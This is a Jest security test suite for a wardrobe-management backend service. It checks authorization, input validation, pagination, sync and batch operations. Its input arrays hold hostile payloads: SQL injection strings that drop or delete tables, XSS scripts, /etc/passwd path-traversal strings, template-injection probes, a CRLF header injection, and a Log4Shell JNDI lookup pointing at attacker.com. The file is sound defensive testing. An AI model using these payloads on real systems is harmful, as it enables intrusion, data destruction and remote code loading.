// /backend/tests/security/wardrobeService.security.test.ts
import { wardrobeService } from '../../services/wardrobeService';
import { wardrobeModel } from '../../models/wardrobeModel';
import { garmentModel } from '../../models/garmentModel';
import { ApiError } from '../../utils/ApiError';
import { wardrobeMocks } from '../__mocks__/wardrobes.mock';
import { v4 as uuidv4 } from 'uuid';

// Mock the model dependencies
jest.mock('../../models/wardrobeModel');
jest.mock('../../models/garmentModel');

const mockedWardrobeModel = wardrobeModel as jest.Mocked<typeof wardrobeModel>;
const mockedGarmentModel = garmentModel as jest.Mocked<typeof garmentModel>;

describe('WardrobeService Security Tests', () => {
  let legitimateUserId: string;
  let maliciousUserId: string;
  let targetWardrobeId: string;
  let targetGarmentId: string;
  let legitimateWardrobe: any;
  let legitimateGarment: any;

  beforeEach(() => {
    jest.clearAllMocks();
    
    legitimateUserId = uuidv4();
    maliciousUserId = uuidv4();
    targetWardrobeId = uuidv4();
    targetGarmentId = uuidv4();

    legitimateWardrobe = wardrobeMocks.createValidWardrobe({
      id: targetWardrobeId,
      user_id: legitimateUserId
    });

    legitimateGarment = wardrobeMocks.garments.createMockGarment({
      id: targetGarmentId,
      user_id: legitimateUserId
    });
  });

  describe('Authorization Security', () => {
    describe('Horizontal Privilege Escalation Prevention', () => {
      it('should prevent accessing other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.getWardrobe(targetWardrobeId, maliciousUserId))
          .rejects.toThrow(ApiError);

        const error = await wardrobeService.getWardrobe(targetWardrobeId, maliciousUserId)
          .catch(err => err);
        
        expect(error.statusCode).toBe(403);
        expect(error.code).toBe('AUTHORIZATION_ERROR');
        expect(error.message).toContain('permission');
      });

      it('should prevent updating other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.updateWardrobe({
          wardrobeId: targetWardrobeId,
          userId: maliciousUserId,
          name: 'Hijacked Wardrobe'
        })).rejects.toThrow(ApiError);
      });

      it('should prevent deleting other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.deleteWardrobe(targetWardrobeId, maliciousUserId))
          .rejects.toThrow(ApiError);
      });

      it('should prevent adding garments to other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.addGarmentToWardrobe({
          wardrobeId: targetWardrobeId,
          userId: maliciousUserId,
          garmentId: targetGarmentId
        })).rejects.toThrow(ApiError);
      });

      it('should prevent removing garments from other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.removeGarmentFromWardrobe({
          wardrobeId: targetWardrobeId,
          userId: maliciousUserId,
          garmentId: targetGarmentId
        })).rejects.toThrow(ApiError);
      });

      it('should prevent reordering garments in other users\' wardrobes', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        await expect(wardrobeService.reorderGarments(
          targetWardrobeId, 
          maliciousUserId, 
          [targetGarmentId]
        )).rejects.toThrow(ApiError);
      });
    });

    describe('Resource Ownership Validation', () => {
      it('should prevent using other users\' garments in own wardrobes', async () => {
        const ownWardrobe = wardrobeMocks.createValidWardrobe({ user_id: maliciousUserId });
        const otherUsersGarment = wardrobeMocks.garments.createMockGarment({ 
          user_id: legitimateUserId 
        });

        mockedWardrobeModel.findById.mockResolvedValue(ownWardrobe);
        mockedGarmentModel.findById.mockResolvedValue(otherUsersGarment);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        await expect(wardrobeService.addGarmentToWardrobe({
          wardrobeId: ownWardrobe.id,
          userId: maliciousUserId,
          garmentId: otherUsersGarment.id
        })).rejects.toThrow(ApiError);

        const error = await wardrobeService.addGarmentToWardrobe({
          wardrobeId: ownWardrobe.id,
          userId: maliciousUserId,
          garmentId: otherUsersGarment.id
        }).catch(err => err);

        expect(error.statusCode).toBe(403);
        expect(error.code).toBe('AUTHORIZATION_ERROR');
        expect(error.message).toContain('garment');
      });

      it('should verify garment exists before allowing operations', async () => {
        const ownWardrobe = wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId });
        
        mockedWardrobeModel.findById.mockResolvedValue(ownWardrobe);
        mockedGarmentModel.findById.mockResolvedValue(null); // Non-existent garment

        await expect(wardrobeService.addGarmentToWardrobe({
          wardrobeId: ownWardrobe.id,
          userId: legitimateUserId,
          garmentId: uuidv4() // Non-existent garment ID
        })).rejects.toThrow(ApiError);

        const error = await wardrobeService.addGarmentToWardrobe({
          wardrobeId: ownWardrobe.id,
          userId: legitimateUserId,
          garmentId: uuidv4()
        }).catch(err => err);

        expect(error.statusCode).toBe(404);
        expect(error.code).toBe('GARMENT_NOT_FOUND');
      });
    });

    describe('User Session Security', () => {
      it('should validate user ID format to prevent injection', async () => {
        const maliciousUserIds = [
          "'; DROP TABLE users; --",
          "<script>alert('xss')</script>",
          "../../etc/passwd",
          "null",
          "undefined",
          "",
          " ",
          "00000000-0000-0000-0000-000000000000", // Nil UUID
        ];

        // Mock to return empty results for any user ID (graceful handling)
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const maliciousId of maliciousUserIds) {
          // Should handle gracefully - either return empty results or throw controlled error
          const result = await wardrobeService.getUserWardrobes({ userId: maliciousId });
          expect(result).toBeDefined();
          expect(Array.isArray(result.wardrobes)).toBe(true);
          expect(result.wardrobes).toHaveLength(0);
        }
      });

      it('should handle missing or invalid wardrobe IDs securely', async () => {
        const invalidWardrobeIds = [
          "invalid-uuid",
          "'; DROP TABLE wardrobes; --",
          "<script>alert('xss')</script>",
          "",
          null,
          undefined
        ];

        for (const invalidId of invalidWardrobeIds) {
          mockedWardrobeModel.findById.mockResolvedValue(null);
          
          await expect(wardrobeService.getWardrobe(invalidId as string, legitimateUserId))
            .rejects.toThrow(ApiError);
        }
      });
    });
  });

  describe('Input Validation Security', () => {
    describe('SQL Injection Prevention', () => {
      it('should sanitize wardrobe names against SQL injection', async () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE wardrobes; --",
          "' OR '1'='1",
          "'; DELETE FROM users WHERE id='1'; --",
          "' UNION SELECT * FROM users --",
          "Robert'; DROP TABLE students;--"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const maliciousName of sqlInjectionAttempts) {
          // Should either reject due to validation or sanitize safely
          await expect(wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: maliciousName
          })).rejects.toThrow(ApiError);
        }
      });

      it('should sanitize descriptions against SQL injection', async () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE wardrobes; --",
          "' OR '1'='1",
          "'; DELETE FROM users; --"
        ];

        // Setup mocks for successful creation
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
        mockedWardrobeModel.create.mockResolvedValue(legitimateWardrobe);

        for (const maliciousDescription of sqlInjectionAttempts) {
          const result = await wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: 'Valid Name',
            description: maliciousDescription
          });
          
          expect(result).toBeDefined(); // Description allows special chars, but should be parameterized in DB
          expect(result.id).toBeDefined();
        }
      });
    });

    describe('XSS Prevention', () => {
      it('should handle XSS attempts in wardrobe names', async () => {
        const xssAttempts = [
          "<script>alert('xss')</script>",
          "<img src=x onerror=alert('xss')>",
          "javascript:alert('xss')",
          "<svg onload=alert('xss')>",
          "<%2Fscript%3E%3Cscript%3Ealert('xss')%3C%2Fscript%3E"
        ];

        for (const xssPayload of xssAttempts) {
          await expect(wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: xssPayload
          })).rejects.toThrow(ApiError); // Should be rejected by name validation
        }
      });

      it('should handle XSS attempts in search terms', async () => {
        const wardrobes = [wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })];
        mockedWardrobeModel.findByUserId.mockResolvedValue(wardrobes);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        const xssAttempts = [
          "<script>alert('xss')</script>",
          "<img src=x onerror=alert('xss')>",
          "javascript:alert('xss')"
        ];

        for (const xssPayload of xssAttempts) {
          // Should handle search gracefully without executing scripts
          await expect(wardrobeService.searchWardrobes(legitimateUserId, xssPayload))
            .resolves.toBeDefined();
        }
      });
    });

    describe('Path Traversal Prevention', () => {
      it('should prevent directory traversal in input parameters', async () => {
        const pathTraversalAttempts = [
          "../../etc/passwd",
          "..\\..\\windows\\system32",
          "....//....//etc/passwd",
          "%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
          "..%252f..%252f..%252fetc%252fpasswd"
        ];

        for (const maliciousPath of pathTraversalAttempts) {
          await expect(wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: maliciousPath
          })).rejects.toThrow(ApiError); // Should be rejected by validation
        }
      });
    });

    describe('Buffer Overflow Prevention', () => {
      it('should prevent extremely long input strings', async () => {
        const extremelyLongString = 'A'.repeat(100000); // 100KB string
        
        await expect(wardrobeService.createWardrobe({
          userId: legitimateUserId,
          name: extremelyLongString
        })).rejects.toThrow(ApiError);

        await expect(wardrobeService.createWardrobe({
          userId: legitimateUserId,
          name: 'Valid Name',
          description: extremelyLongString
        })).rejects.toThrow(ApiError);
      });

      it('should handle unicode overflow attacks', async () => {
        const unicodeOverflow = '🚀'.repeat(10000); // Large unicode string
        
        await expect(wardrobeService.createWardrobe({
          userId: legitimateUserId,
          name: unicodeOverflow
        })).rejects.toThrow(ApiError);
      });
    });
  });

  describe('Business Logic Security', () => {
    describe('Rate Limiting Scenarios', () => {
      it('should handle rapid wardrobe creation attempts', async () => {
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
        mockedWardrobeModel.create.mockResolvedValue(legitimateWardrobe);

        // Simulate rapid creation attempts
        const rapidCreationPromises = Array.from({ length: 100 }, (_, i) =>
          wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: `Rapid Wardrobe ${i}`
          })
        );

        // Should handle all requests without crashing
        await expect(Promise.allSettled(rapidCreationPromises))
          .resolves.toBeDefined();
      });

      it('should enforce user limits under concurrent access', async () => {
        // User already has maximum wardrobes
        const maxWardrobes = Array.from({ length: 50 }, () => 
          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
        );
        mockedWardrobeModel.findByUserId.mockResolvedValue(maxWardrobes);

        // Try to create multiple wardrobes concurrently
        const concurrentCreations = Array.from({ length: 10 }, () =>
          wardrobeService.createWardrobe({
            userId: legitimateUserId,
            name: `Concurrent Wardrobe ${Math.random()}`
          })
        );

        const results = await Promise.allSettled(concurrentCreations);
        
        // All should be rejected due to limit
        results.forEach(result => {
          expect(result.status).toBe('rejected');
        });
      });
    });

    describe('Resource Exhaustion Prevention', () => {
      it('should prevent creating wardrobes with maximum capacity garments', async () => {
        const maxGarments = Array.from({ length: 200 }, () => 
          wardrobeMocks.garments.createMockGarment({ user_id: legitimateUserId })
        );

        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedGarmentModel.findById.mockResolvedValue(legitimateGarment);
        mockedWardrobeModel.getGarments.mockResolvedValue(maxGarments);

        await expect(wardrobeService.addGarmentToWardrobe({
          wardrobeId: targetWardrobeId,
          userId: legitimateUserId,
          garmentId: targetGarmentId
        })).rejects.toThrow(ApiError);

        const error = await wardrobeService.addGarmentToWardrobe({
          wardrobeId: targetWardrobeId,
          userId: legitimateUserId,
          garmentId: targetGarmentId
        }).catch(err => err);

        // Check the actual error code from the service
        expect(error.code).toBe('BUSINESS_LOGIC_ERROR');
        expect(error.message).toContain('Wardrobe is full');
        expect(error.message).toContain('200');
      });

      it('should handle large reorder operations safely', async () => {
        const manyGarments = Array.from({ length: 200 }, () => 
          wardrobeMocks.garments.createMockGarment({ user_id: legitimateUserId })
        );
        const garmentIds = manyGarments.map(g => g.id);

        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedWardrobeModel.getGarments.mockResolvedValue(manyGarments);
        mockedWardrobeModel.addGarment.mockResolvedValue(true);

        // Should handle large reorder without timing out
        await expect(wardrobeService.reorderGarments(
          targetWardrobeId,
          legitimateUserId,
          garmentIds.reverse()
        )).resolves.toBeDefined();
      });
    });

    describe('Data Integrity Security', () => {
      it('should prevent duplicate garments through race conditions', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedGarmentModel.findById.mockResolvedValue(legitimateGarment);
        mockedWardrobeModel.getGarments.mockResolvedValue([]); // Empty initially
        mockedWardrobeModel.addGarment.mockResolvedValue(true);

        // Simulate race condition - multiple concurrent adds of same garment
        const concurrentAdds = Array.from({ length: 5 }, () =>
          wardrobeService.addGarmentToWardrobe({
            wardrobeId: targetWardrobeId,
            userId: legitimateUserId,
            garmentId: targetGarmentId
          })
        );

        // All should succeed in this mock scenario, but in real scenario
        // database constraints should prevent duplicates
        await expect(Promise.allSettled(concurrentAdds))
          .resolves.toBeDefined();
      });

      it('should maintain consistency during concurrent modifications', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedWardrobeModel.findByUserId.mockResolvedValue([legitimateWardrobe]);
        mockedWardrobeModel.update.mockResolvedValue(legitimateWardrobe);

        // Simulate concurrent updates
        const concurrentUpdates = [
          wardrobeService.updateWardrobe({
            wardrobeId: targetWardrobeId,
            userId: legitimateUserId,
            name: 'Updated Name 1'
          }),
          wardrobeService.updateWardrobe({
            wardrobeId: targetWardrobeId,
            userId: legitimateUserId,
            description: 'Updated Description'
          })
        ];

        await expect(Promise.allSettled(concurrentUpdates))
          .resolves.toBeDefined();
      });
    });
  });

  describe('Information Disclosure Prevention', () => {
    describe('Error Message Security', () => {
      it('should not leak sensitive information in error messages', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        try {
          await wardrobeService.getWardrobe(targetWardrobeId, maliciousUserId);
        } catch (error) {
          // Error should not reveal that wardrobe exists
          const apiError = error as ApiError;
          expect(apiError.message).not.toContain(legitimateUserId);
          expect(apiError.message).not.toContain(legitimateWardrobe.id);
          expect(apiError.message).not.toContain('exists');
          expect(apiError.message).toContain('permission');
        }
      });

      it('should provide consistent error messages for non-existent resources', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(null);

        const nonExistentError = await wardrobeService.getWardrobe(
          uuidv4(), 
          legitimateUserId
        ).catch(err => err);

        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        const unauthorizedError = await wardrobeService.getWardrobe(
          targetWardrobeId, 
          maliciousUserId
        ).catch(err => err);

        // Both should look similar to prevent information leakage
        expect(typeof nonExistentError.message).toBe('string');
        expect(typeof unauthorizedError.message).toBe('string');
      });
    });

    describe('Data Leakage Prevention', () => {
      it('should not return other users\' data in search results', async () => {
        const userWardrobes = [
          wardrobeMocks.createValidWardrobe({ 
            user_id: legitimateUserId,
            name: 'Legitimate Wardrobe' 
          })
        ];
        
        mockedWardrobeModel.findByUserId.mockResolvedValue(userWardrobes);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        const results = await wardrobeService.searchWardrobes(
          legitimateUserId, 
          'Wardrobe'
        );

        // Should only return user's own wardrobes
        results.forEach(wardrobe => {
          expect(wardrobe.user_id).toBe(legitimateUserId);
        });
      });

      it('should not include sensitive metadata in responses', async () => {
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        const result = await wardrobeService.getWardrobeWithGarments(
          targetWardrobeId, 
          legitimateUserId
        );

        // Should not contain internal database fields or sensitive data
        expect(result).not.toHaveProperty('password');
        expect(result).not.toHaveProperty('salt');
        expect(result).not.toHaveProperty('internal_notes');
        expect(result).not.toHaveProperty('admin_flags');
      });
    });
  });

  describe('Session and State Security', () => {
    describe('Session Fixation Prevention', () => {
      it('should handle operations with potentially hijacked session', async () => {
        // Simulate session where user ID might be manipulated
        const suspiciousOperations = [
          () => wardrobeService.getUserWardrobes({ userId: 'admin' }),
          () => wardrobeService.getUserWardrobes({ userId: 'root' }),
          () => wardrobeService.getUserWardrobes({ userId: 'system' }),
          () => wardrobeService.getUserWardrobes({ userId: '0' }),
          () => wardrobeService.getUserWardrobes({ userId: 'null' })
        ];

        for (const operation of suspiciousOperations) {
          mockedWardrobeModel.findByUserId.mockResolvedValue([]);
          
          // Should handle gracefully without crashing
          await expect(operation()).resolves.toBeDefined();
        }
      });
    });

    describe('State Manipulation Prevention', () => {
      it('should validate state consistency across operations', async () => {
        // Simulate attempt to manipulate wardrobe state
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedWardrobeModel.getGarments
          .mockResolvedValueOnce([]) // Capacity check - empty
          .mockResolvedValueOnce([legitimateGarment]); // Duplicate check - already has garment
        mockedGarmentModel.findById.mockResolvedValue(legitimateGarment);

        // This should fail due to the inconsistent state (garment already exists)
        await expect(wardrobeService.addGarmentToWardrobe({
          wardrobeId: targetWardrobeId,
          userId: legitimateUserId,
          garmentId: targetGarmentId
        })).rejects.toThrow(ApiError);
      });
    });
  });

  describe('Denial of Service Prevention', () => {
    describe('Resource Consumption Attacks', () => {
      it('should handle malicious input sizes gracefully', async () => {
        const massiveArray = Array.from({ length: 10000 }, () => uuidv4());
        
        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        // Should reject or handle gracefully, not consume excessive resources
        await expect(wardrobeService.reorderGarments(
          targetWardrobeId,
          legitimateUserId,
          massiveArray
        )).rejects.toThrow(ApiError);
      });

      it('should limit processing time for complex operations', async () => {
        // Test that operations complete within reasonable time
        const start = Date.now();
        
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
        
        await wardrobeService.getUserWardrobeStats(legitimateUserId);
        
        const duration = Date.now() - start;
        expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
      });
    });

    describe('Memory Exhaustion Prevention', () => {
      it('should handle large dataset operations without memory issues', async () => {
        // Simulate large number of wardrobes
        const largeWardrobeSet = Array.from({ length: 1000 }, () => 
          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
        );

        mockedWardrobeModel.findByUserId.mockResolvedValue(largeWardrobeSet);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        // Should handle large datasets efficiently with new parameter structure
        await expect(wardrobeService.getUserWardrobes({ userId: legitimateUserId }))
          .resolves.toBeDefined();
      });
    });
  });

  describe('Mobile Features Security', () => {
    describe('Cursor-Based Pagination Security', () => {
      it('should prevent cursor manipulation attacks', async () => {
        const maliciousCursors = [
          "'; DROP TABLE wardrobes; --",
          "<script>alert('xss')</script>",
          "../../etc/passwd",
          "00000000-0000-0000-0000-000000000000",
          "${jndi:ldap://attacker.com/exploit}",
          "{{7*7}}",
          "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('xss')</script>"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const maliciousCursor of maliciousCursors) {
          // Should handle malicious cursors safely
          const result = await wardrobeService.getUserWardrobes({
            userId: legitimateUserId,
            pagination: {
              cursor: maliciousCursor,
              limit: 20
            }
          });
          
          expect(result).toBeDefined();
          expect(result.wardrobes).toEqual([]);
        }
      });

      it('should enforce pagination limits', async () => {
        const excessiveLimits = [100, 1000, 999999, -1, 0];
        
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const limit of excessiveLimits) {
          const result = await wardrobeService.getUserWardrobes({
            userId: legitimateUserId,
            pagination: { limit }
          });

          // Should clamp to reasonable limits (max 50)
          expect(result.pagination?.count ?? 0).toBeLessThanOrEqual(50);
        }
      });

      it('should prevent backward pagination manipulation', async () => {
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        // Attempt to manipulate backward pagination
        const result = await wardrobeService.getUserWardrobes({
          userId: legitimateUserId,
          pagination: {
            cursor: uuidv4(),
            limit: 20,
            direction: 'backward' as any
          }
        });

        expect(result).toBeDefined();
        expect(result.wardrobes).toBeDefined();
      });
    });

    describe('Filter Injection Prevention', () => {
      it('should sanitize search filter inputs', async () => {
        const injectionAttempts = [
          "'; DROP TABLE wardrobes; --",
          "' OR '1'='1",
          "<script>alert('xss')</script>",
          "${jndi:ldap://attacker.com/exploit}",
          "{{constructor.constructor('return process')().exit()}}",
          "%' OR '1'='1' --"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const injection of injectionAttempts) {
          const result = await wardrobeService.getUserWardrobes({
            userId: legitimateUserId,
            filters: { search: injection }
          });

          expect(result).toBeDefined();
          expect(result.wardrobes).toEqual([]);
        }
      });

      it('should validate sortBy field against whitelist', async () => {
        const maliciousSortFields = [
          "user_id",
          "password",
          "'; DROP TABLE wardrobes; --",
          "internal_flags",
          "1=1",
          "created_at); DELETE FROM users; --"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([legitimateWardrobe]);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        for (const maliciousField of maliciousSortFields) {
          const result = await wardrobeService.getUserWardrobes({
            userId: legitimateUserId,
            filters: { sortBy: maliciousField as any }
          });

          // Should ignore invalid sort fields and use default
          expect(result).toBeDefined();
        }
      });

      it('should prevent date filter injection', async () => {
        const maliciousDates = [
          "'; DROP TABLE wardrobes; --",
          "2024-01-01T00:00:00Z'); DELETE FROM wardrobes; --",
          "invalid-date",
          "${new Date().toISOString()}",
          "{{7*7}}"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const maliciousDate of maliciousDates) {
          // Should handle malicious date inputs safely
          const result = await wardrobeService.getUserWardrobes({
            userId: legitimateUserId,
            filters: {
              createdAfter: maliciousDate,
              updatedAfter: maliciousDate
            }
          });

          expect(result).toBeDefined();
        }
      });
    });

    describe('Sync Security', () => {
      it('should prevent timestamp manipulation in sync', async () => {
        const maliciousTimestamps = [
          "1970-01-01T00:00:00Z", // Epoch - would sync everything
          "2099-12-31T23:59:59Z", // Future - might cause issues
          "'; DROP TABLE wardrobes; --",
          "invalid-timestamp"
        ];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const timestamp of maliciousTimestamps) {
          // Should handle invalid timestamps gracefully
          const result = await wardrobeService.syncWardrobes({
            userId: legitimateUserId,
            lastSyncTimestamp: new Date(timestamp)
          });

          expect(result).toBeDefined();
          expect(result.sync).toBeDefined();
        }

        // Test null and undefined separately - they should cause TypeScript errors in real usage
        // but in tests we verify runtime behavior
        const nullResult = await wardrobeService.syncWardrobes({
          userId: legitimateUserId,
          lastSyncTimestamp: null as any
        });
        expect(nullResult).toBeDefined();

        const undefinedResult = await wardrobeService.syncWardrobes({
          userId: legitimateUserId,
          lastSyncTimestamp: undefined as any
        });
        expect(undefinedResult).toBeDefined();
      });

      it('should prevent cross-user data leakage in sync', async () => {
        const userWardrobes = [
          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId }),
          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
        ];

        // Mock should only return requesting user's wardrobes
        mockedWardrobeModel.findByUserId
          .mockImplementation((userId) => 
            Promise.resolve(userId === legitimateUserId ? userWardrobes : [])
          );

        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        const syncResult = await wardrobeService.syncWardrobes({
          userId: legitimateUserId,
          lastSyncTimestamp: new Date(Date.now() - 60000)
        });

        // Should only contain legitimate user's wardrobes
        syncResult.wardrobes.created.forEach(w => {
          expect(w.user_id).toBe(legitimateUserId);
        });
      });

      it('should enforce reasonable sync limits', async () => {
        // Create many wardrobes to test sync limits
        const manyWardrobes = Array.from({ length: 1000 }, () => 
          wardrobeMocks.createValidWardrobe({ user_id: legitimateUserId })
        );

        mockedWardrobeModel.findByUserId.mockResolvedValue(manyWardrobes);
        mockedWardrobeModel.getGarments.mockResolvedValue([]);

        // Very old timestamp would sync everything
        const veryOldTimestamp = new Date('2020-01-01');

        const result = await wardrobeService.syncWardrobes({
          userId: legitimateUserId,
          lastSyncTimestamp: veryOldTimestamp
        });

        // Should handle large sync gracefully
        expect(result).toBeDefined();
        expect(result.sync.hasMore).toBeDefined();
      });
    });

    describe('Batch Operations Security', () => {
      it('should prevent batch operation injection', async () => {
        const maliciousOperations = [
          {
            type: 'create',
            data: { 
              name: "'; DROP TABLE wardrobes; --",
              description: "<script>alert('xss')</script>"
            },
            clientId: 'malicious-1'
          },
          {
            type: 'update',
            data: {
              id: "'; DELETE FROM wardrobes; --",
              name: "Innocent Name"
            },
            clientId: 'malicious-2'
          },
          {
            type: 'delete',
            data: {
              id: "' OR '1'='1"
            },
            clientId: 'malicious-3'
          }
        ];

        // All operations should be rejected due to validation
        const result = await wardrobeService.batchOperations({
          userId: legitimateUserId,
          operations: maliciousOperations as any
        });

        expect(result.errors.length).toBeGreaterThan(0);
      });

      it('should enforce batch size limits', async () => {
        const oversizedBatch = Array.from({ length: 51 }, (_, i) => ({
          type: 'create' as const,
          data: { name: `Batch ${i}` },
          clientId: `client-${i}`
        }));

        await expect(wardrobeService.batchOperations({
          userId: legitimateUserId,
          operations: oversizedBatch
        })).rejects.toThrow('Cannot process more than 50 operations at once');
      });

      it('should prevent cross-user operations in batch', async () => {
        const operations = [
          {
            type: 'update' as const,
            data: {
              id: targetWardrobeId, // Belongs to legitimate user
              name: 'Updated Name'
            },
            clientId: 'update-1'
          }
        ];

        mockedWardrobeModel.findById.mockResolvedValue(legitimateWardrobe);

        // Malicious user trying to update legitimate user's wardrobe
        const result = await wardrobeService.batchOperations({
          userId: maliciousUserId,
          operations
        });

        expect(result.errors).toHaveLength(1);
        expect(result.errors[0].code).toContain('AUTHORIZATION');
      });

      it('should handle malformed batch operations', async () => {
        const malformedOperations = [
          {
            // Missing type
            data: { name: 'Test' },
            clientId: 'malformed-1'
          },
          {
            type: 'invalid-type', // Invalid type
            data: { name: 'Test' },
            clientId: 'malformed-2'
          },
          {
            type: 'create',
            // Missing data
            clientId: 'malformed-3'
          },
          {
            type: 'create',
            data: { name: 'Valid' },
            // Missing clientId
          }
        ];

        const result = await wardrobeService.batchOperations({
          userId: legitimateUserId,
          operations: malformedOperations as any
        });

        // All should result in errors
        expect(result.errors.length).toBeGreaterThan(0);
      });

      it('should maintain atomicity in batch operations', async () => {
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);
        mockedWardrobeModel.create
          .mockResolvedValueOnce(legitimateWardrobe) // First succeeds
          .mockRejectedValueOnce(new Error('Database error')); // Second fails

        const operations = [
          {
            type: 'create' as const,
            data: { name: 'Success Wardrobe' },
            clientId: 'success-1'
          },
          {
            type: 'create' as const,
            data: { name: 'Fail Wardrobe' },
            clientId: 'fail-1'
          }
        ];

        const result = await wardrobeService.batchOperations({
          userId: legitimateUserId,
          operations
        });

        // Should handle partial failures gracefully
        expect(result.results).toHaveLength(1);
        expect(result.errors).toHaveLength(1);
        expect(result.summary.successful).toBe(1);
        expect(result.summary.failed).toBe(1);
      });
    });

    describe('Legacy Compatibility Security', () => {
      it('should handle legacy pagination parameter injection', async () => {
        const maliciousPages = [-1, 0, 999999, "1'; DROP TABLE wardrobes; --", null];
        const maliciousLimits = [-1, 0, 1000, "50'; DELETE FROM users; --", null];

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        for (const page of maliciousPages) {
          for (const limit of maliciousLimits) {
            if (page !== null && limit !== null) {
              const result = await wardrobeService.getUserWardrobes({
                userId: legitimateUserId,
                legacy: { 
                  page: page as any, 
                  limit: limit as any 
                }
              });

              expect(result).toBeDefined();
            }
          }
        }
      });

      it('should maintain security when mixing legacy and mobile features', async () => {
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        // Attempt to use both pagination systems simultaneously
        const result = await wardrobeService.getUserWardrobes({
          userId: legitimateUserId,
          pagination: { cursor: uuidv4(), limit: 20 },
          legacy: { page: 1, limit: 50 }
        });

        // Should handle gracefully, preferring one system
        expect(result).toBeDefined();
        expect(result.wardrobes).toBeDefined();
      });
    });

    describe('Combined Attack Scenarios', () => {
      it('should handle combined injection attacks across features', async () => {
        const complexAttack = {
          userId: "admin'; DROP TABLE users; --",
          pagination: {
            cursor: "<script>alert('xss')</script>",
            limit: 999999
          },
          filters: {
            search: "' OR '1'='1",
            sortBy: "password" as any,
            sortOrder: "'; DELETE FROM wardrobes; --" as any,
            createdAfter: "1970-01-01'; DROP TABLE wardrobes; --"
          }
        };

        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        // Should handle complex attack gracefully
        const result = await wardrobeService.getUserWardrobes(complexAttack);
        expect(result).toBeDefined();
        expect(result.wardrobes).toEqual([]);
      });

      it('should prevent timing attacks in sync operations', async () => {
        const timings: number[] = [];
        
        mockedWardrobeModel.findByUserId.mockResolvedValue([]);

        // Measure timing for valid vs invalid operations
        for (let i = 0; i < 10; i++) {
          const start = Date.now();
          
          await wardrobeService.syncWardrobes({
            userId: i % 2 === 0 ? legitimateUserId : maliciousUserId,
            lastSyncTimestamp: new Date()
          });
          
          timings.push(Date.now() - start);
        }

        // Timing differences should be minimal (< 50ms variance)
        const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
        const maxVariance = Math.max(...timings.map(t => Math.abs(t - avgTiming)));
        
        expect(maxVariance).toBeLessThan(50);
      });
    });
  });
});